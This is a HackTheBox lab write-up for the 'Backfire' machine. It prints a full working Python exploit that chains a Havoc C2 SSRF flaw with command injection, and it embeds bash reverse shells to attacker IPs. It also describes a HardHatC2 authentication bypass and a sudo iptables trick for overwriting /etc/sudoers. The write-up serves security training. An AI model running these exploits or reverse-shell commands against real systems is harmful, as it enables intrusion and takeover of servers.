---
title: Backfire
categories:
  - HackTheBox
tags: [cve, c2, portforward]
media_subpath: /images/hackthebox_backfire/
image:
  path: https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png
---


# Summary

Backfire is a Medium difficulty HackTheBox machine that involves exploiting a vulnerability in the Havoc C2 framework to gain remote code execution (RCE) through a Server-Side Request Forgery (SSRF) attack. At the time of launch, only the separated exploits were available, so we needed to adapt and join both of them to create a functional exploit script. After getting access to the machine, another vulnerable `C2` framework was found, giving us access to another user, which we used to escalate privileges to the root user because of `sudo` misconfiguration. The machine is a great example of how to chain multiple vulnerabilities together to make a functional exploit script. 

# Theory Used
- [Port Forwarding](/theory/misc/portforward/#ssh-local-port-forwarding)
- [SSRF](/theory/misc/ssrf/)

# Walkthrough


## Nmap
We started off with an Nmap scan to identify open ports and services on the target machine. 

The scan revealed three open ports: SSH on port 22, HTTPS on port 443, and HTTP on port 8000.

```bash
sudo nmap -sVC -Pn -oN nmap 10.10.11.49
```

```bash
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open  ssl/http syn-ack nginx 1.22.1
8000/tcp open  http     syn-ack nginx 1.22.1
```

## (8000) - Web Server

Looking at the web server on port 8000, we found a directory listing with two files: `disable_tls.patch` and `havoc.yaotl`.

```bash
curl -s http://10.10.11.49:8000 | html2text

# Index of /
* * *
    [../](../)
    [disable_tls.patch](disable_tls.patch)                                  17-Dec-2024 12:31    1559
    [havoc.yaotl](havoc.yaotl)                                        17-Dec-2024 12:34     875
* * *
```

After downloading both of these files to our local machine, we examined them to understand their purpose.

```bash
cat disable_tls.patch
```

```plaintext
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();

     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();

     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }

                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }
```

This patch disables TLS for the WebSocket management port (40056) by modifying the `Connector.cc` and `teamserver.go` files. It changes the WebSocket connection from `wss://` to `ws://` and removes the SSL configuration settings.

```bash
cat havoc.yaotl
```

```plaintext
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1"
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
```
This file appears to be a configuration file for the Havoc C2 framework, specifying the teamserver details, operator credentials, demon settings, and listener configurations.

## (443) - Web Server HTTPS

Next, we checked the web server on port 443, which was running Nginx. The server responded with a default Nginx `404 Not Found` page, indicating that no specific content was hosted on this port.

Since we had already identified the WebSocket management port (40056) from the `havoc.yaotl` file, we proceeded to search up some possible vulnerability for the Havoc C2 framework, which led us to a [CVE-2024-41570](https://github.com/chebuya/Havoc-C2-SSRF-poc) vulnerability.
> PS: The fact that the github repository belongs to the creator of this box was also a huge green flag that this was the right direction.
{: .prompt-info}

Setting up a simple HTTP server on our machine to test for the `SSRF`, we could validate that the vulnerability was indeed present in the Havoc C2 framework.

![NON](file-20250601223815738.png)

Looking for other exploits for the Havoc C2 framework, we found a [v2-vulnerabilities/havoc_auth_rce](https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py), which allowed us to execute arbitrary commands on the server by sending a specially crafted WebSocket frame.

We set up a Havoc C2 server on our local machine, using the `havoc.yaotl` configuration file to configure the teamserver and operator credentials. Testing the exploit we validated that it worked as expected, allowing us to execute commands on the server.

![NON](file-20250603141614601.png)

## Attack Chain: `SSRF` to `RCE`

Since the Havoc C2 framework was vulnerable to SSRF, and the WebSocket management port (40056) is not accessible from the outside, we could use the SSRF vulnerability to send requests to the WebSocket management port and trigger the RCE vulnerability.

For that to work, we need to modify the `SSRF` script to send the WebSocket Upgrade request, authenticate with the Havoc C2 server, and then send the RCE payload to execute commands on the server.

### Testing The Adapted `RCE` Script Locally

To mimic the environment of the target machine, we set up a local Havoc C2 server using the `havoc.yaotl` configuration file and patched our files with the `disable_tls.patch` to disable `tls` on our havoc server.

![NON](file-20250606172702060.png)

Building the server as shown in the documentation makes the server the same as the one running on the target machine.

We need to modify the exploit to use raw sockets instead of the `websocket-client` library, since the `SSRF` exploit handles the WebSocket framing manually with the functions `read_socket` and `write_socket`.

I spent a lot of time with debugging and chatGPT to get the exploit to work, the following table summarizes the changes made to the original exploit script to adapt it for the target machine:


| Feature           | Original Version      | Modified Version                           |
| ----------------- | --------------------- | ------------------------------------------ |
| WebSocket library | `websocket-client`    | Raw `socket` + custom framing              |
| TLS support       | Optional via `sslopt` | Not used                                   |
| Frame handling    | Automatic             | Manual (RFC 6455 compliant)                |
| Reverse shell     | Interactive shell     | One-shot bash reverse shell                |
| Listener creation | Present               | Skipped                                    |
| Debug output      | Minimal               | Verbose with debugging                     |
| Flexibility       | Easier to read/write  | Lower-level control                        |
| Use case          | General Havoc usage   | Exploit development / manual SSRF chaining |



#### Modified `RCE` Script



```python
import socket
import hashlib
import json
import os
import time

# ========== Config ==========
HOST = "172.16.61.128"
PORT = 40056
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"

def build_websocket_frame(payload: str) -> bytes:
    payload_bytes = payload.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)  # FIN=1, text frame

    length = len(payload_bytes)
    if length <= 125:
        frame.append(0x80 | length)
    elif length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(length.to_bytes(2, byteorder='big'))
    else:
        frame.append(0x80 | 127)
        frame.extend(length.to_bytes(8, byteorder='big'))

    masking_key = os.urandom(4)
    frame.extend(masking_key)

    masked = bytearray(b ^ masking_key[i % 4] for i, b in enumerate(payload_bytes))
    frame.extend(masked)

    return bytes(frame)

def parse_websocket_frame(frame: bytes) -> bytes:
    if not frame:
        raise ValueError("No data received")
    print(f"[DEBUG] Raw frame header: {frame[:8].hex()}")

    fin = (frame[0] & 0x80) >> 7
    opcode = frame[0] & 0x0F

    if opcode == 0x8:
        raise ValueError("Received close frame")
    if opcode not in (0x1, 0x2):
        raise ValueError(f"Unsupported opcode: {opcode:#x}")

    is_text = (opcode == 0x1)

    length = frame[1] & 0x7F
    index = 2
    if length == 126:
        length = int.from_bytes(frame[2:4], 'big')
        index = 4
    elif length == 127:
        length = int.from_bytes(frame[2:10], 'big')
        index = 10

    data = frame[index:index+length]
    return data.decode() if is_text else data  # return str or bytes

# ========== Connect and Handshake ==========
sock = socket.create_connection((HOST, PORT))
handshake = (
    "GET /havoc/ HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
)
sock.sendall(handshake.encode())

# Wait for handshake response
resp = sock.recv(4096)
if b"101 Switching Protocols" not in resp:
    print("[!] WebSocket handshake failed")
    exit(1)
print("[+] WebSocket handshake completed")

# ========== Authenticate ==========
auth_payload = {
    "Body": {
        "Info": {
            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
            "User": USER
        },
        "SubEvent": 3
    },
    "Head": {
        "Event": 1,
        "OneTime": "",
        "Time": "18:40:17",
        "User": USER
    }
}
sock.sendall(build_websocket_frame(json.dumps(auth_payload)))
resp = parse_websocket_frame(sock.recv(4096))
print("[+] Auth Response:", resp)

# ========== Trigger RCE with `whoami` ==========
cmd = "bash -c 'bash -i >& /dev/tcp/192.168.15.186/9999 0>&1'"
injection = r""" \\\\\\\" -mbla; """ + cmd + r""" 1>&2 && false #"""

rce_payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Arch": "x64",
            "Config": (
                "{\n"
                "    \"Amsi/Etw Patch\": \"None\",\n"
                "    \"Indirect Syscall\": false,\n"
                "    \"Injection\": {\n"
                "        \"Alloc\": \"Native/Syscall\",\n"
                "        \"Execute\": \"Native/Syscall\",\n"
                "        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n"
                "        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n"
                "    },\n"
                "    \"Jitter\": \"0\",\n"
                "    \"Proxy Loading\": \"None (LdrLoadDll)\",\n"
                f"    \"Service Name\": \"{injection}\",\n"
                "    \"Sleep\": \"2\",\n"
                "    \"Sleep Jmp Gadget\": \"None\",\n"
                "    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n"
                "    \"Stack Duplication\": false\n"
                "}"
            ),
            "Format": "Windows Service Exe",
            "Listener": "abc"
        },
        "SubEvent": 2
    },
    "Head": {
        "Event": 5,
        "OneTime": "true",
        "Time": "18:39:04",
        "User": USER
    }
}

sock.sendall(build_websocket_frame(json.dumps(rce_payload)))

# ========== Wait for Compile Output ==========
print("[*] Waiting for compile output...")
while True:
    try:
        data = sock.recv(8192)
        #text = parse_websocket_frame(data)
        payload = parse_websocket_frame(data)

        if isinstance(payload, bytes):
            try:
                payload = payload.decode("utf-8")
            except Exception as e:
                print("[!] Error decoding ninary frame:", e)
                continue

        if "compile output" in payload:
            msg = json.loads(payload)
            out = msg["Body"]["Info"]["Message"].split("\n")
            print("\n".join(out[1:]))  # Skip first line
            break
    except Exception as e:
        print("[!] Error while receiving:", e)
        break

sock.close()
```

Running the modified script, although our output for the commands on our machine was not so consistent, the commands were executed on the target machine as expected, so by sending a reverse shell command, we could successfully trigger the RCE vulnerability and receive a reverse shell.

![NON](file-20250606235646127.png)

### Final Exploit Script

We then combined the SSRF and RCE scripts into a single script that would first register the agent, open a socket, and then execute the RCE command through the socket. Since the socket was open by the `SSRF` exploit, we commented out the commands that started the socket of our `RCE` script, and modified the sending of the payloads to send to the socket we had opened with the `SSRF` exploit.

The following is the final exploit script that combines both the SSRF and RCE functionalities:

```bash
cat functional_rce.py
```

```python
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "pycryptodome",
#     "requests",
# ]
# ///

# Exploit Title: Havoc C2 0.7 Unauthenticated SSRF
# Date: 2024-07-13
# Exploit Author: @_chebuya
# Software Link: https://github.com/HavocFramework/Havoc
# Version: v0.7
# Tested on: Ubuntu 20.04 LTS
# CVE: CVE-2024-41570
# Description: This exploit works by spoofing a demon agent registration and checkins to open a TCP socket on the teamserver and read/write data from it. This allows attackers to leak origin IPs of teamservers and much more.
# Github: https://github.com/chebuya/Havoc-C2-SSRF-poc
# Blog: https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/
import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()


from Crypto.Cipher import AES
from Crypto.Util import Counter

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext


def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)


def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"


    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")


def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data


    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""


    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()


# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

import socket
import hashlib
import json
import os
import time

# ========== Config ==========
HOST = "127.0.0.1"
PORT = 40056
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"

def build_websocket_frame(payload: str) -> bytes:
    payload_bytes = payload.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)  # FIN=1, text frame

    length = len(payload_bytes)
    if length <= 125:
        frame.append(0x80 | length)
    elif length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(length.to_bytes(2, byteorder='big'))
    else:
        frame.append(0x80 | 127)
        frame.extend(length.to_bytes(8, byteorder='big'))

    masking_key = os.urandom(4)
    frame.extend(masking_key)

    masked = bytearray(b ^ masking_key[i % 4] for i, b in enumerate(payload_bytes))
    frame.extend(masked)

    return bytes(frame)

def parse_websocket_frame(frame: bytes) -> bytes:
    if not frame:
        raise ValueError("No data received")
    print(f"[DEBUG] Raw frame header: {frame[:8].hex()}")

    fin = (frame[0] & 0x80) >> 7
    opcode = frame[0] & 0x0F

    if opcode == 0x8:
        raise ValueError("Received close frame")
    if opcode not in (0x1, 0x2):
        raise ValueError(f"Unsupported opcode: {opcode:#x}")

    is_text = (opcode == 0x1)

    length = frame[1] & 0x7F
    index = 2
    if length == 126:
        length = int.from_bytes(frame[2:4], 'big')
        index = 4
    elif length == 127:
        length = int.from_bytes(frame[2:10], 'big')
        index = 10

    data = frame[index:index+length]
    return data.decode() if is_text else data  # return str or bytes

# ========== Connect and Handshake ==========
#sock = socket.create_connection((HOST, PORT))
handshake = (
    "GET /havoc/ HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
)
#sock.sendall(handshake.encode())
write_socket(socket_id, handshake.encode())

# Wait for handshake response
#resp = sock.recv(4096)
resp = read_socket(socket_id)
# if b"101 Switching Protocols" not in resp:
#     print("[!] WebSocket handshake failed")
#     exit(1)
# print("[+] WebSocket handshake completed")

# ========== Authenticate ==========
auth_payload = {
    "Body": {
        "Info": {
            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),
            "User": USER
        },
        "SubEvent": 3
    },
    "Head": {
        "Event": 1,
        "OneTime": "",
        "Time": "18:40:17",
        "User": USER
    }
}
payload_json = json.dumps(auth_payload)
frame = build_websocket_frame(payload_json)
#sock.sendall(build_websocket_frame(json.dumps(auth_payload)))
write_socket(socket_id, frame)
#resp = parse_websocket_frame(sock.recv(4096))
#print("[+] Auth Response:", resp)
resp = read_socket(socket_id)

# ========== Trigger RCE with `whoami` ==========
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.24/9999 0>&1'"
injection = r""" \\\\\\\" -mbla; """ + cmd + r""" 1>&2 && false #"""

rce_payload = {
    "Body": {
        "Info": {
            "AgentType": "Demon",
            "Arch": "x64",
            "Config": (
                "{\n"
                "    \"Amsi/Etw Patch\": \"None\",\n"
                "    \"Indirect Syscall\": false,\n"
                "    \"Injection\": {\n"
                "        \"Alloc\": \"Native/Syscall\",\n"
                "        \"Execute\": \"Native/Syscall\",\n"
                "        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n"
                "        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n"
                "    },\n"
                "    \"Jitter\": \"0\",\n"
                "    \"Proxy Loading\": \"None (LdrLoadDll)\",\n"
                f"    \"Service Name\": \"{injection}\",\n"
                "    \"Sleep\": \"2\",\n"
                "    \"Sleep Jmp Gadget\": \"None\",\n"
                "    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n"
                "    \"Stack Duplication\": false\n"
                "}"
            ),
            "Format": "Windows Service Exe",
            "Listener": "abc"
        },
        "SubEvent": 2
    },
    "Head": {
        "Event": 5,
        "OneTime": "true",
        "Time": "18:39:04",
        "User": USER
    }
}

payload_json = json.dumps(rce_payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)
#sock.sendall(build_websocket_frame(json.dumps(rce_payload)))

# # ========== Wait for Compile Output ==========
# print("[*] Waiting for compile output...")
# while True:
#     try:
#         data = sock.recv(8192)
#         #text = parse_websocket_frame(data)
#         payload = parse_websocket_frame(data)
#
#         if isinstance(payload, bytes):
#             try:
#                 payload = payload.decode("utf-8")
#             except Exception as e:
#                 print("[!] Error decoding ninary frame:", e)
#                 continue
#
#         if "compile output" in payload:
#             msg = json.loads(payload)
#             out = msg["Body"]["Info"]["Message"].split("\n")
#             print("\n".join(out[1:]))  # Skip first line
#             break
#     except Exception as e:
#         print("[!] Error while receiving:", e)
#         break
#
# sock.close()
#
#
# request_data = b"GET /vulnerable HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n"
# write_socket(socket_id, request_data)
# print(read_socket(socket_id).decode())
```

By running the final exploit script, we could successfully open a socket on the target machine and execute commands through it, giving us a reverse shell as the `ilya` user.  

![NON](file-20250607002152680.png)

From the shell obtained, we upgraded our shell to a `SSH` one by adding our public key to the `~/.ssh/authorized_keys` file of the `ilya` user, allowing us to connect to the target machine via SSH.

![NON](file-20250607003018555.png)

## Horizontal Privilege Escalation - `sergej` User

Looking at the home directory of the `ilya` user, we found a file named `hardhat.txt`, which contained some information about the `sergej` user and the HardHatC2 framework.

```bash
ilya@backfire:~$ ls
files  hardhat.txt  Havoc  user.txt
ilya@backfire:~$ cat hardhat.txt
Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#
i
```

Looking for the [HardHatC2 github](https://github.com/DragoQCC/CrucibleC2), we found that the service by default runs on port `7096` 

![NON](file-20250607003327345.png)

So we port forwarded the port to our local machine using SSH Command Line:

![NON](file-20250607003350964.png)
> Note: The port forwarding command is `ssh -L 7096:localhost:7096 ilya@backfire.htb` if you don't want to use the ssh command line.
>
> To enable the ssh command line you could send the command as an option to the `ssh` command, with `ssh -o "EnableEscapeCommandline=yes" ...` or simply add the line `EnableEscapeCommandline yes` to your `/etc/ssh/ssh_config` file.
{: .prompt-info}

After forwarding the port, we could access the HardHatC2 web interface at `http://localhost:7096`.
![NON](file-20250607003411704.png)

Trying all credentials we had, none of them could get us in, so we looked for vulnerabilities in the HardHatC2 framework, which led us to a [Authentication Bypass (User Creation)](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7).

By running the exploit, the user `sth_pentest` is created at the server, trying to login with the credentials `sth_pentest:sth_pentest` we could successfully login to the HardHatC2 web interface.

![NON](file-20250607004557449.png)

![NON](file-20250607004628224.png)
![NON](file-20250607004638755.png)

From the web interface, at the `/ImplantInteract` endpoint, we could create a new terminal and run commands inside the machine. Sending the command `whoami`, we could see that we were running as the `sergej` user.

![NON](file-20250607004812277.png)

Sending a reverse shell payload `bash -i >& /dev/tcp/<IP>/<LOCAL_PORT> 0>&1`, we could get a reverse shell as the `sergej` user.
![NON](file-20250607004856372.png)

In order to get a more stable shell, we upgraded our shell to a `SSH` one by adding our public key to the `~/.ssh/authorized_keys` file of the `sergej` user
![NON](file-20250607010513374.png)

Looking at the `sergej` user's permissions on `sudoers` with the command `sudo -l`, we could see that the user has permissions to run the commands `/usr/sbin/iptables` and `/usr/sbin/iptables-save` as the root user without a password.

Looking for ways to abuse this privilege, we came across a [Linux Privilege Escalation with iptables](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/) technique, which allows us to escalate our privileges to root by overwriting root owned files with the `iptables` command.

The article overwrote the `/etc/shadow` file with the contents of the `/etc/passwd` file with a modified `root` entry, effectively changing the root password to a known value, thus allowing the user to login as root without a password. But in our case, we kept receiving an permission error when trying to overwrite the `/etc/shadow` file, so we decided to overwrite the `/etc/sudoers` file instead, which could allow us to run any command as root without a password if we add the entry `sergej ALL=(ALL) NOPASSWD: ALL` to the file.

So, following the path from the article:

![NON](file-20250607011809271.png)
![NON](file-20250607011529614.png)

And now we have `root` privileges, we can spawn a root shell by running the command `sudo -i` or `sudo su`.
![NON](file-20250607011642085.png)
